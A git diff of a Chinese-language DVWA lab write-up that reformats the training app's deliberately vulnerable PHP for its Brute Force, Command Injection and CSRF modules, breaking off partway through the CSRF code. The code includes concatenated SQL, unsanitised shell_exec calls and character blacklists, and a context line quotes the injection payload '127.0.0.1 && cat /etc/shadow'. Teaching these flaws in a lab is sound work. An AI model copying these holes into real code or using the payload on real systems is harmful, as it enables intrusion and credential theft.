@@ -1,24 +1,32 @@
 # [dvwa](http://www.dvwa.co.uk/)
 
-DVWA共有十个模块，分别是
-```
-Brute Force（暴力（破解））
-Command Injection（命令行注入）
-CSRF（跨站请求伪造）
-File Inclusion（文件包含）
-File Upload（文件上传）
-Insecure CAPTCHA （不安全的验证码）
-SQL Injection（SQL注入）
-SQL Injection（Blind）（SQL盲注）
-XSS（Reflected）（反射型跨站脚本）
-XSS（Stored）（存储型跨站脚本）
-```
+## 前言
+工具一下，exp 一连，shell 就有了，这谁都能学会，但在自己挖洞的过程中，基础的东西就很重要了，我觉得 dvwa 靶机的真正价值是带新人入门，将 web 各个方面都接触一些，这样有了开始，之后就有方向了。
+
+---
+
+## 实验环境
+- phpstudy（php5.2珍藏版）：http://phpstudy.php.cn/wenda/404.html
+(可以测试%00 截断)
+- Microsoft Windows 10 企业版 LTSC - 10.0.17763
+- dvwa Version 1.10 *Development* (Release date: 2015-10-08)
+- VMware® Workstation 15 Pro - 15.0.0 build-10134415
+- kali 4.19.0-kali3-amd64
+
+---
 
 ## Reference
 - [新手指南：DVWA-1.9全级别教程之Brute Force](https://www.freebuf.com/articles/web/116437.html)
 - [新手指南：DVWA-1.9全级别教程之Command Injection](https://www.freebuf.com/articles/web/116714.html)
 - [新手指南：DVWA-1.9全级别教程之CSRF](https://www.freebuf.com/articles/web/118352.html)
 - [新手指南：DVWA-1.9全级别教程之File Inclusion](https://www.freebuf.com/articles/web/119150.html)
+- [新手指南：DVWA-1.9全级别教程之File Upload](https://www.freebuf.com/articles/web/119467.html)
+- [新手指南：DVWA-1.9全级别教程之Insecure CAPTCHA](https://www.freebuf.com/articles/web/119692.html)
+- [新手指南：DVWA-1.9全级别教程之SQL Injection](https://www.freebuf.com/articles/web/120747.html)
+- [新手指南：DVWA-1.9全级别教程之SQL Injection(Blind)](https://www.freebuf.com/articles/web/120985.html)
+
+
+
 
 
 
@@ -53,32 +61,33 @@ Brute Force，即暴力（破解），是指黑客利用密码字典，使用穷
 ```php
 <?php
 
-if(isset($_GET['Login'])){
-//Getusername
-$user=$_GET['username'];
+if( isset( $_GET[ 'Login' ] ) ) {
+	// Get username
+	$user = $_GET[ 'username' ];
 
-//Getpassword
-$pass=$_GET['password'];
-$pass=md5($pass);
+	// Get password
+	$pass = $_GET[ 'password' ];
+	$pass = md5( $pass );
 
-//Checkthedatabase
-$query="SELECT*FROM`users`WHEREuser='$user'ANDpassword='$pass';";
-$result=mysql_query($query)ordie('<pre>'.mysql_error().'</pre>');
+	// Check the database
+	$query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
+	$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
 
-if($result&&mysql_num_rows($result)==1){
-//Getusersdetails
-$avatar=mysql_result($result,0,"avatar");
+	if( $result && mysqli_num_rows( $result ) == 1 ) {
+		// Get users details
+		$row    = mysqli_fetch_assoc( $result );
+		$avatar = $row["avatar"];
 
-//Loginsuccessful
-echo"<p>Welcometothepasswordprotectedarea{$user}</p>";
-echo"<imgsrc="{$avatar}"/>";
-}
-else{
-//Loginfailed
-echo"<pre><br/>Usernameand/orpasswordincorrect.</pre>";
-}
+		// Login successful
+		$html .= "<p>Welcome to the password protected area {$user}</p>";
+		$html .= "<img src=\"{$avatar}\" />";
+	}
+	else {
+		// Login failed
+		$html .= "<pre><br />Username and/or password incorrect.</pre>";
+	}
 
-mysql_close();
+	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
 }
 
 ?>
@@ -111,35 +120,36 @@ mysql_close();
 ```php
 <?php
 
-if(isset($_GET['Login'])){
-//Sanitiseusernameinput
-$user=$_GET['username'];
-$user=mysql_real_escape_string($user);
+if( isset( $_GET[ 'Login' ] ) ) {
+	// Sanitise username input
+	$user = $_GET[ 'username' ];
+	$user = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
 
-//Sanitisepasswordinput
-$pass=$_GET['password'];
-$pass=mysql_real_escape_string($pass);
-$pass=md5($pass);
+	// Sanitise password input
+	$pass = $_GET[ 'password' ];
+	$pass = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+	$pass = md5( $pass );
 
-//Checkthedatabase
-$query="SELECT*FROM`users`WHEREuser='$user'ANDpassword='$pass';";
-$result=mysql_query($query)ordie('<pre>'.mysql_error().'</pre>');
+	// Check the database
+	$query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
+	$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
 
-if($result&&mysql_num_rows($result)==1){
-//Getusersdetails
-$avatar=mysql_result($result,0,"avatar");
+	if( $result && mysqli_num_rows( $result ) == 1 ) {
+		// Get users details
+		$row    = mysqli_fetch_assoc( $result );
+		$avatar = $row["avatar"];
 
-//Loginsuccessful
-echo"<p>Welcometothepasswordprotectedarea{$user}</p>";
-echo"<imgsrc="{$avatar}"/>";
-}
-else{
-//Loginfailed
-sleep(2);
-echo"<pre><br/>Usernameand/orpasswordincorrect.</pre>";
-}
+		// Login successful
+		$html .= "<p>Welcome to the password protected area {$user}</p>";
+		$html .= "<img src=\"{$avatar}\" />";
+	}
+	else {
+		// Login failed
+		sleep( 2 );
+		$html .= "<pre><br />Username and/or password incorrect.</pre>";
+	}
 
-mysql_close();
+	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
 }
 
 ?>
@@ -158,43 +168,44 @@ mysql_close();
 ```php
 <?php
 
-if(isset($_GET['Login'])){
-//CheckAnti-CSRFtoken
-checkToken($_REQUEST['user_token'],$_SESSION['session_token'],'index.php');
+if( isset( $_GET[ 'Login' ] ) ) {
+	// Check Anti-CSRF token
+	checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
 
-//Sanitiseusernameinput
-$user=$_GET['username'];
-$user=stripslashes($user);
-$user=mysql_real_escape_string($user);
+	// Sanitise username input
+	$user = $_GET[ 'username' ];
+	$user = stripslashes( $user );
+	$user = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
 
-//Sanitisepasswordinput
-$pass=$_GET['password'];
-$pass=stripslashes($pass);
-$pass=mysql_real_escape_string($pass);
-$pass=md5($pass);
+	// Sanitise password input
+	$pass = $_GET[ 'password' ];
+	$pass = stripslashes( $pass );
+	$pass = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+	$pass = md5( $pass );
 
-//Checkdatabase
-$query="SELECT*FROM`users`WHEREuser='$user'ANDpassword='$pass';";
-$result=mysql_query($query)ordie('<pre>'.mysql_error().'</pre>');
+	// Check database
+	$query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
+	$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
 
-if($result&&mysql_num_rows($result)==1){
-//Getusersdetails
-$avatar=mysql_result($result,0,"avatar");
+	if( $result && mysqli_num_rows( $result ) == 1 ) {
+		// Get users details
+		$row    = mysqli_fetch_assoc( $result );
+		$avatar = $row["avatar"];
 
-//Loginsuccessful
-echo"<p>Welcometothepasswordprotectedarea{$user}</p>";
-echo"<imgsrc="{$avatar}"/>";
+		// Login successful
+		$html .= "<p>Welcome to the password protected area {$user}</p>";
+		$html .= "<img src=\"{$avatar}\" />";
+	}
+	else {
+		// Login failed
+		sleep( rand( 0, 3 ) );
+		$html .= "<pre><br />Username and/or password incorrect.</pre>";
+	}
+
+	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
 }
-else{
-//Loginfailed
-sleep(rand(0,3));
-echo"<pre><br/>Usernameand/orpasswordincorrect.</pre>";
-}
 
-mysql_close();
-}
-
-//GenerateAnti-CSRFtoken
+// Generate Anti-CSRF token
 generateSessionToken();
 
 ?>
@@ -313,97 +324,103 @@ import urllib3.request
 ```php
 <?php
 
-if(isset($_POST['Login'])){
-//CheckAnti-CSRFtoken
-checkToken($_REQUEST['user_token'],$_SESSION['session_token'],'index.php');
+if( isset( $_POST[ 'Login' ] ) && isset ($_POST['username']) && isset ($_POST['password']) ) {
+	// Check Anti-CSRF token
+	checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
 
-//Sanitiseusernameinput
-$user=$_POST['username'];
-$user=stripslashes($user);
-$user=mysql_real_escape_string($user);
+	// Sanitise username input
+	$user = $_POST[ 'username' ];
+	$user = stripslashes( $user );
+	$user = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
 
-//Sanitisepasswordinput
-$pass=$_POST['password'];
-$pass=stripslashes($pass);
-$pass=mysql_real_escape_string($pass);
-$pass=md5($pass);
+	// Sanitise password input
+	$pass = $_POST[ 'password' ];
+	$pass = stripslashes( $pass );
+	$pass = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+	$pass = md5( $pass );
 
-//Defaultvalues
-$total_failed_login=3;
-$lockout_time=15;
-$account_locked=false;
+	// Default values
+	$total_failed_login = 3;
+	$lockout_time       = 15;
+	$account_locked     = false;
 
-//Checkthedatabase(Checkuserinformation)
-$data=$db->prepare('SELECTfailed_login,last_loginFROMusersWHEREuser=(:user)LIMIT1;');
-$data->bindParam(':user',$user,PDO::PARAM_STR);
-$data->execute();
-$row=$data->fetch();
+	// Check the database (Check user information)
+	$data = $db->prepare( 'SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;' );
+	$data->bindParam( ':user', $user, PDO::PARAM_STR );
+	$data->execute();
+	$row = $data->fetch();
 
-//Checktoseeiftheuserhasbeenlockedout.
-if(($data->rowCount()==1)&&($row['failed_login']>=$total_failed_login)){
-//Userlockedout.Note,usingthismethodwouldallowforuserenumeration!
-//echo"<pre><br/>Thisaccounthasbeenlockedduetotoomanyincorrectlogins.</pre>";
+	// Check to see if the user has been locked out.
+	if( ( $data->rowCount() == 1 ) && ( $row[ 'failed_login' ] >= $total_failed_login ) )  {
+		// User locked out.  Note, using this method would allow for user enumeration!
+		//$html .= "<pre><br />This account has been locked due to too many incorrect logins.</pre>";
 
-//Calculatewhentheuserwouldbeallowedtologinagain
-$last_login=$row['last_login'];
-$last_login=strtotime($last_login);
-$timeout=strtotime("{$last_login}+{$lockout_time}minutes");
-$timenow=strtotime("now");
+		// Calculate when the user would be allowed to login again
+		$last_login = strtotime( $row[ 'last_login' ] );
+		$timeout    = $last_login + ($lockout_time * 60);
+		$timenow    = time();
 
-//Checktoseeifenoughtimehaspassed,ifithasn'tlockedtheaccount
-if($timenow>$timeout)
-$account_locked=true;
+		/*
+		print "The last login was: " . date ("h:i:s", $last_login) . "<br />";
+		print "The timenow is: " . date ("h:i:s", $timenow) . "<br />";
+		print "The timeout is: " . date ("h:i:s", $timeout) . "<br />";
+		*/
+
+		// Check to see if enough time has passed, if it hasn't locked the account
+		if( $timenow < $timeout ) {
+			$account_locked = true;
+			// print "The account is locked<br />";
+		}
+	}
+
+	// Check the database (if username matches the password)
+	$data = $db->prepare( 'SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );
+	$data->bindParam( ':user', $user, PDO::PARAM_STR);
+	$data->bindParam( ':password', $pass, PDO::PARAM_STR );
+	$data->execute();
+	$row = $data->fetch();
+
+	// If its a valid login...
+	if( ( $data->rowCount() == 1 ) && ( $account_locked == false ) ) {
+		// Get users details
+		$avatar       = $row[ 'avatar' ];
+		$failed_login = $row[ 'failed_login' ];
+		$last_login   = $row[ 'last_login' ];
+
+		// Login successful
+		$html .= "<p>Welcome to the password protected area <em>{$user}</em></p>";
+		$html .= "<img src=\"{$avatar}\" />";
+
+		// Had the account been locked out since last login?
+		if( $failed_login >= $total_failed_login ) {
+			$html .= "<p><em>Warning</em>: Someone might of been brute forcing your account.</p>";
+			$html .= "<p>Number of login attempts: <em>{$failed_login}</em>.<br />Last login attempt was at: <em>${last_login}</em>.</p>";
+		}
+
+		// Reset bad login count
+		$data = $db->prepare( 'UPDATE users SET failed_login = "0" WHERE user = (:user) LIMIT 1;' );
+		$data->bindParam( ':user', $user, PDO::PARAM_STR );
+		$data->execute();
+	} else {
+		// Login failed
+		sleep( rand( 2, 4 ) );
+
+		// Give the user some feedback
+		$html .= "<pre><br />Username and/or password incorrect.<br /><br/>Alternative, the account has been locked because of too many failed logins.<br />If this is the case, <em>please try again in {$lockout_time} minutes</em>.</pre>";
+
+		// Update bad login count
+		$data = $db->prepare( 'UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;' );
+		$data->bindParam( ':user', $user, PDO::PARAM_STR );
+		$data->execute();
+	}
+
+	// Set the last login time
+	$data = $db->prepare( 'UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;' );
+	$data->bindParam( ':user', $user, PDO::PARAM_STR );
+	$data->execute();
 }
 
-//Checkthedatabase(ifusernamematchesthepassword)
-$data=$db->prepare('SELECT*FROMusersWHEREuser=(:user)ANDpassword=(:password)LIMIT1;');
-$data->bindParam(':user',$user,PDO::PARAM_STR);
-$data->bindParam(':password',$pass,PDO::PARAM_STR);
-$data->execute();
-$row=$data->fetch();
-
-//Ifitsavalidlogin...
-if(($data->rowCount()==1)&&($account_locked==false)){
-//Getusersdetails
-$avatar=$row['avatar'];
-$failed_login=$row['failed_login'];
-$last_login=$row['last_login'];
-
-//Loginsuccessful
-echo"<p>Welcometothepasswordprotectedarea<em>{$user}</em></p>";
-echo"<imgsrc="{$avatar}"/>";
-
-//Hadtheaccountbeenlockedoutsincelastlogin?
-if($failed_login>=$total_failed_login){
-echo"<p><em>Warning</em>:Someonemightofbeenbruteforcingyouraccount.</p>";
-echo"<p>Numberofloginattempts:<em>{$failed_login}</em>.<br/>Lastloginattemptwasat:<em>${last_login}</em>.</p>";
-}
-
-//Resetbadlogincount
-$data=$db->prepare('UPDATEusersSETfailed_login="0"WHEREuser=(:user)LIMIT1;');
-$data->bindParam(':user',$user,PDO::PARAM_STR);
-$data->execute();
-}
-else{
-//Loginfailed
-sleep(rand(2,4));
-
-//Givetheusersomefeedback
-echo"<pre><br/>Usernameand/orpasswordincorrect.<br/><br/>Alternative,theaccounthasbeenlockedbecauseoftoomanyfailedlogins.<br/>Ifthisisthecase,<em>pleasetryagainin{$lockout_time}minutes</em>.</pre>";
-
-//Updatebadlogincount
-$data=$db->prepare('UPDATEusersSETfailed_login=(failed_login+1)WHEREuser=(:user)LIMIT1;');
-$data->bindParam(':user',$user,PDO::PARAM_STR);
-$data->execute();
-}
-
-//Setthelastlogintime
-$data=$db->prepare('UPDATEusersSETlast_login=now()WHEREuser=(:user)LIMIT1;');
-$data->bindParam(':user',$user,PDO::PARAM_STR);
-$data->execute();
-}
-
-//GenerateAnti-CSRFtoken
+// Generate Anti-CSRF token
 generateSessionToken();
 
 ?>
@@ -426,21 +443,21 @@ Command Injection，即命令注入，是指通过提交恶意构造的参数破
 <?php
 
 if( isset( $_POST[ 'Submit' ]  ) ) {
-    // Get input
-    $target = $_REQUEST[ 'ip' ];
+	// Get input
+	$target = $_REQUEST[ 'ip' ];
 
-    // Determine OS and execute the ping command.
-    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
-        // Windows
-        $cmd = shell_exec( 'ping  ' . $target );
-    }
-    else {
-        // *nix
-        $cmd = shell_exec( 'ping  -c 4 ' . $target );
-    }
+	// Determine OS and execute the ping command.
+	if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
+		// Windows
+		$cmd = shell_exec( 'ping  ' . $target );
+	}
+	else {
+		// *nix
+		$cmd = shell_exec( 'ping  -c 4 ' . $target );
+	}
 
-    // Feedback for the end user
-    echo "<pre>{$cmd}</pre>";
+	// Feedback for the end user
+	$html .= "<pre>{$cmd}</pre>";
 }
 
 ?>
@@ -471,30 +488,30 @@ Linux 下输入 `127.0.0.1 && cat /etc/shadow` 甚至可以读取 shadow 文件�
 <?php
 
 if( isset( $_POST[ 'Submit' ]  ) ) {
-    // Get input
-    $target = $_REQUEST[ 'ip' ];
+	// Get input
+	$target = $_REQUEST[ 'ip' ];
 
-    // Set blacklist
-    $substitutions = array(
-        '&&' => '',
-        ';'  => '',
-    );
+	// Set blacklist
+	$substitutions = array(
+		'&&' => '',
+		';'  => '',
+	);
 
-    // Remove any of the charactars in the array (blacklist).
-    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
+	// Remove any of the charactars in the array (blacklist).
+	$target = str_replace( array_keys( $substitutions ), $substitutions, $target );
 
-    // Determine OS and execute the ping command.
-    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
-        // Windows
-        $cmd = shell_exec( 'ping  ' . $target );
-    }
-    else {
-        // *nix
-        $cmd = shell_exec( 'ping  -c 4 ' . $target );
-    }
+	// Determine OS and execute the ping command.
+	if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
+		// Windows
+		$cmd = shell_exec( 'ping  ' . $target );
+	}
+	else {
+		// *nix
+		$cmd = shell_exec( 'ping  -c 4 ' . $target );
+	}
 
-    // Feedback for the end user
-    echo "<pre>{$cmd}</pre>";
+	// Feedback for the end user
+	$html .= "<pre>{$cmd}</pre>";
 }
 
 ?>
@@ -528,37 +545,37 @@ if( isset( $_POST[ 'Submit' ]  ) ) {
 <?php
 
 if( isset( $_POST[ 'Submit' ]  ) ) {
-    // Get input
-    $target = trim($_REQUEST[ 'ip' ]);
+	// Get input
+	$target = trim($_REQUEST[ 'ip' ]);
 
-    // Set blacklist
-    $substitutions = array(
-        '&'  => '',
-        ';'  => '',
-        '| ' => '',
-        '-'  => '',
-        '$'  => '',
-        '('  => '',
-        ')'  => '',
-        '`'  => '',
-        '||' => '',
-    );
+	// Set blacklist
+	$substitutions = array(
+		'&'  => '',
+		';'  => '',
+		'| ' => '',
+		'-'  => '',
+		'$'  => '',
+		'('  => '',
+		')'  => '',
+		'`'  => '',
+		'||' => '',
+	);
 
-    // Remove any of the charactars in the array (blacklist).
-    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
+	// Remove any of the charactars in the array (blacklist).
+	$target = str_replace( array_keys( $substitutions ), $substitutions, $target );
 
-    // Determine OS and execute the ping command.
-    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
-        // Windows
-        $cmd = shell_exec( 'ping  ' . $target );
-    }
-    else {
-        // *nix
-        $cmd = shell_exec( 'ping  -c 4 ' . $target );
-    }
+	// Determine OS and execute the ping command.
+	if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
+		// Windows
+		$cmd = shell_exec( 'ping  ' . $target );
+	}
+	else {
+		// *nix
+		$cmd = shell_exec( 'ping  -c 4 ' . $target );
+	}
 
-    // Feedback for the end user
-    echo "<pre>{$cmd}</pre>";
+	// Feedback for the end user
+	$html .= "<pre>{$cmd}</pre>";
 }
 
 ?>
@@ -580,38 +597,38 @@ Command 1 | Command 2
 <?php
 
 if( isset( $_POST[ 'Submit' ]  ) ) {
-    // Check Anti-CSRF token
-    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
+	// Check Anti-CSRF token
+	checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
 
-    // Get input
-    $target = $_REQUEST[ 'ip' ];
-    $target = stripslashes( $target );
+	// Get input
+	$target = $_REQUEST[ 'ip' ];
+	$target = stripslashes( $target );
 
-    // Split the IP into 4 octects
-    $octet = explode( ".", $target );
+	// Split the IP into 4 octects
+	$octet = explode( ".", $target );
 
-    // Check IF each octet is an integer
-    if( ( is_numeric( $octet[0] ) ) && ( is_numeric( $octet[1] ) ) && ( is_numeric( $octet[2] ) ) && ( is_numeric( $octet[3] ) ) && ( sizeof( $octet ) == 4 ) ) {
-        // If all 4 octets are int's put the IP back together.
-        $target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3];
+	// Check IF each octet is an integer
+	if( ( is_numeric( $octet[0] ) ) && ( is_numeric( $octet[1] ) ) && ( is_numeric( $octet[2] ) ) && ( is_numeric( $octet[3] ) ) && ( sizeof( $octet ) == 4 ) ) {
+		// If all 4 octets are int's put the IP back together.
+		$target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3];
 
-        // Determine OS and execute the ping command.
-        if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
-            // Windows
-            $cmd = shell_exec( 'ping  ' . $target );
-        }
-        else {
-            // *nix
-            $cmd = shell_exec( 'ping  -c 4 ' . $target );
-        }
+		// Determine OS and execute the ping command.
+		if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
+			// Windows
+			$cmd = shell_exec( 'ping  ' . $target );
+		}
+		else {
+			// *nix
+			$cmd = shell_exec( 'ping  -c 4 ' . $target );
+		}
 
-        // Feedback for the end user
-        echo "<pre>{$cmd}</pre>";
-    }
-    else {
-        // Ops. Let the user name theres a mistake
-        echo '<pre>ERROR: You have entered an invalid IP.</pre>';
-    }
+		// Feedback for the end user
+		$html .= "<pre>{$cmd}</pre>";
+	}
+	else {
+		// Ops. Let the user name theres a mistake
+		$html .= '<pre>ERROR: You have entered an invalid IP.</pre>';
+	}
 }
 
 // Generate Anti-CSRF token
@@ -644,29 +661,29 @@ CSRF，全称Cross-site request forgery，翻译过来就是跨站请求伪造�
 <?php
 
 if( isset( $_GET[ 'Change' ] ) ) {
-    // Get input
-    $pass_new  = $_GET[ 'password_new' ];
-    $pass_conf = $_GET[ 'password_conf' ];
+	// Get input
+	$pass_new  = $_GET[ 'password_new' ];
+	$pass_conf = $_GET[ 'password_conf' ];
 
-    // Do the passwords match?
-    if( $pass_new == $pass_conf ) {
-        // They do!
-        $pass_new = mysql_real_escape_string( $pass_new );
-        $pass_new = md5( $pass_new );
+	// Do the passwords match?
+	if( $pass_new == $pass_conf ) {
+		// They do!
+		$pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+		$pass_new = md5( $pass_new );
 
-        // Update the database
-        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
-        $result = mysql_query( $insert ) or die( '<pre>' . mysql_error() . '</pre>' );
+		// Update the database
+		$insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
+		$result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
 
-        // Feedback for the user
-        echo "<pre>Password Changed.</pre>";
-    }
-    else {
-        // Issue with passwords matching
-        echo "<pre>Passwords did not match.</pre>";
-    }
+		// Feedback for the user
+		$html .= "<pre>Password Changed.</pre>";
+	}
+	else {
+		// Issue with passwords matching
+		$html .= "<pre>Passwords did not match.</pre>";
+	}
 
-    mysql_close();
+	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
 }
 
 ?>
@@ -706,36 +723,36 @@ if( isset( $_GET[ 'Change' ] ) ) {
 <?php
 
 if( isset( $_GET[ 'Change' ] ) ) {
-    // Checks to see where the request came from
-    if( eregi( $_SERVER[ 'SERVER_NAME' ], $_SERVER[ 'HTTP_REFERER' ] ) ) {
-        // Get input
-        $pass_new  = $_GET[ 'password_new' ];
-        $pass_conf = $_GET[ 'password_conf' ];
+	// Checks to see where the request came from
+	if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) {
+		// Get input
+		$pass_new  = $_GET[ 'password_new' ];
+		$pass_conf = $_GET[ 'password_conf' ];
 
-        // Do the passwords match?
-        if( $pass_new == $pass_conf ) {
-            // They do!
-            $pass_new = mysql_real_escape_string( $pass_new );
-            $pass_new = md5( $pass_new );
+		// Do the passwords match?
+		if( $pass_new == $pass_conf ) {
+			// They do!
+			$pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+			$pass_new = md5( $pass_new );
 
-            // Update the database
-            $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
-            $result = mysql_query( $insert ) or die( '<pre>' . mysql_error() . '</pre>' );
+			// Update the database
+			$insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
+			$result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
 
-            // Feedback for the user
-            echo "<pre>Password Changed.</pre>";
-        }
-        else {
-            // Issue with passwords matching
-            echo "<pre>Passwords did not match.</pre>";
-        }
-    }
-    else {
-        // Didn't come from a trusted source
-        echo "<pre>That request didn't look correct.</pre>";
-    }
+			// Feedback for the user
+			$html .= "<pre>Password Changed.</pre>";
+		}
+		else {
+			// Issue with passwords matching
+			$html .= "<pre>Passwords did not match.</pre>";
+		}
+	}
+	else {
+		// Didn't come from a trusted source
+		$html .= "<pre>That request didn't look correct.</pre>";
+	}
 
-    mysql_close();
+	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
 }
 
 ?>
@@ -762,32 +779,32 @@ if( isset( $_GET[ 'Change' ] ) ) {
 <?php
 
 if( isset( $_GET[ 'Change' ] ) ) {
-    // Check Anti-CSRF token
-    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
+	// Check Anti-CSRF token
+	checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
 
-    // Get input
-    $pass_new  = $_GET[ 'password_new' ];
-    $pass_conf = $_GET[ 'password_conf' ];
+	// Get input
+	$pass_new  = $_GET[ 'password_new' ];
+	$pass_conf = $_GET[ 'password_conf' ];
 
-    // Do the passwords match?
-    if( $pass_new == $pass_conf ) {
-        // They do!
-        $pass_new = mysql_real_escape_string( $pass_new );
-        $pass_new = md5( $pass_new );
+	// Do the passwords match?
+	if( $pass_new == $pass_conf ) {
+		// They do!
+		$pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+		$pass_new = md5( $pass_new );
 
-        // Update the database
-        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
-        $result = mysql_query( $insert ) or die( '<pre>' . mysql_error() . '</pre>' );
+		// Update the database
+		$insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
+		$result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
 
-        // Feedback for the user
-        echo "<pre>Password Changed.</pre>";
-    }
-    else {
-        // Issue with passwords matching
-        echo "<pre>Passwords did not match.</pre>";
-    }
+		// Feedback for the user
+		$html .= "<pre>Password Changed.</pre>";
+	}
+	else {
+		// Issue with passwords matching
